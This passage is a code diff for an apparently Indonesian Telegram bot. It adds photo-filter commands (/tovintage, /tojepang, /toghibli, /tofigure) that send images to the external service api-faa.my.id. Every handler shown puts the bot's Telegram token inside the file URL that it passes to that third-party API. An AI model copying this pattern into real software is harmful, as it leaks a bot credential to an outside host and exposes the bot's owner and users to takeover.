+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Toanime caption error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 📼 TOVINTAGE COMMAND - AI VINTAGE FILTER
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/tovintage$/, async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = '/tovintage';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+if (!msg.reply_to_message || !msg.reply_to_message.photo) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ Format salah!</blockquote>\n` +
+`<b>Reply foto dengan:</b> <code>/tovintage</code>\n\n` +
+`<i>Balas foto yang ingin diubah jadi gaya vintage.</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+try {
+const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
+const fileId = photo.file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter vintage...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/tovintage?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers['content-type'] || '';
+if (contentType.startsWith('image/')) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>📼 Vintage mode aktif!</blockquote>\n` +
+`<i>Filter vintage berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data?.url;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>📼 Vintage mode aktif!</blockquote>\n` +
+`<i>Filter vintage berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Tovintage error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+try {
+await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
+} catch (e) {}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 📼 HANDLER UNTUK FOTO DENGAN CAPTION /TOVINTAGE
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.on('photo', async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+if (msg.caption && msg.caption.trim() === '/tovintage') {
+const messageText = 'PHOTO_CAPTION: /tovintage';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+try {
+const fileId = msg.photo[msg.photo.length - 1].file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter vintage...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/tovintage?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers['content-type'] || '';
+if (contentType.startsWith('image/')) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>📼 Vintage mode aktif!</blockquote>\n` +
+`<i>Filter vintage berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data?.url;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>📼 Vintage mode aktif!</blockquote>\n` +
+`<i>Filter vintage berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Tovintage caption error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🗾 TOJEPANG COMMAND - AI JAPAN STYLE FILTER
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/tojepang$/, async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = '/tojepang';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+if (!msg.reply_to_message || !msg.reply_to_message.photo) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ Format salah!</blockquote>\n` +
+`<b>Reply foto dengan:</b> <code>/tojepang</code>\n\n` +
+`<i>Balas foto yang ingin diubah jadi gaya Jepang.</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+try {
+const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
+const fileId = photo.file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter gaya Jepang...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/tojepang?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers["content-type"] || "";
+if (contentType.startsWith("image/")) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🗾 Kamu sudah di Jepang!</blockquote>\n` +
+`<i>Filter gaya Jepang berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🗾 Kamu sudah di Jepang!</blockquote>\n` +
+`<i>Filter gaya Jepang berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Tojepang error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+try {
+await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
+} catch (e) {}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🗾 HANDLER UNTUK FOTO DENGAN CAPTION /TOJEPANG
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.on('photo', async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+if (msg.caption && msg.caption.trim() === '/tojepang') {
+const messageText = 'PHOTO_CAPTION: /tojepang';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+try {
+const fileId = msg.photo[msg.photo.length - 1].file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter gaya Jepang...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/tojepang?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers["content-type"] || "";
+if (contentType.startsWith("image/")) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🗾 Kamu sudah di Jepang!</blockquote>\n` +
+`<i>Filter gaya Jepang berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🗾 Kamu sudah di Jepang!</blockquote>\n` +
+`<i>Filter gaya Jepang berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Tojepang caption error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🌿 TOGHIBLI COMMAND - AI GHIBLI STYLE FILTER
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/toghibli$/, async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = '/toghibli';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+if (!msg.reply_to_message || !msg.reply_to_message.photo) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ Format salah!</blockquote>\n` +
+`<b>Reply foto dengan:</b> <code>/toghibli</code>\n\n` +
+`<i>Balas foto yang ingin diubah jadi gaya Ghibli.</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+try {
+const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
+const fileId = photo.file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter gaya Ghibli...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/toghibli?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers["content-type"] || "";
+if (contentType.startsWith("image/")) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🌿 Foto kamu jadi gaya Ghibli!</blockquote>\n` +
+`<i>Filter gaya Ghibli berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🌿 Foto kamu sudah jadi Ghibli!</blockquote>\n` +
+`<i>Filter gaya Ghibli berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Toghibli error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+try {
+await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
+} catch (e) {}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🌿 HANDLER UNTUK FOTO DENGAN CAPTION /TOGHIBLI
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.on('photo', async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+if (msg.caption && msg.caption.trim() === '/toghibli') {
+const messageText = 'PHOTO_CAPTION: /toghibli';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+try {
+const fileId = msg.photo[msg.photo.length - 1].file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter gaya Ghibli...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/toghibli?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers["content-type"] || "";
+if (contentType.startsWith("image/")) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🌿 Foto kamu jadi gaya Ghibli!</blockquote>\n` +
+`<i>Filter gaya Ghibli berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🌿 Foto kamu sudah jadi Ghibli!</blockquote>\n` +
+`<i>Filter gaya Ghibli berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Toghibli caption error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🤖 TOFIGURE COMMAND - AI FIGURINE FILTER
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/tofigure$/, async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = '/tofigure';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+if (!msg.reply_to_message || !msg.reply_to_message.photo) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ Format salah!</blockquote>\n` +
+`<b>Reply foto dengan:</b> <code>/tofigure</code>\n\n` +
+`<i>Balas foto yang ingin diubah jadi figurine.</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+try {
+const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
+const fileId = photo.file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter figurine AI...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/tofigura?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers["content-type"] || "";
+if (contentType.startsWith("image/")) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>✅ Figurine jadi 😎</blockquote>\n` +
+`<i>Filter figurine AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>✅ Figurine jadi 😎</blockquote>\n` +
+`<i>Filter figurine AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Tofigure error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+try {
+await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
+} catch (e) {}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🤖 HANDLER UNTUK FOTO DENGAN CAPTION /TOFIGURE
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.on('photo', async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+if (msg.caption && msg.caption.trim() === '/tofigure') {
+const messageText = 'PHOTO_CAPTION: /tofigure';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+try {
+const fileId = msg.photo[msg.photo.length - 1].file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter figurine AI...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/tofigura?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers["content-type"] || "";
+if (contentType.startsWith("image/")) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>✅ Figurine jadi 😎</blockquote>\n` +
+`<i>Filter figurine AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>✅ Figurine jadi 😎</blockquote>\n` +
+`<i>Filter figurine AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Tofigure caption error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
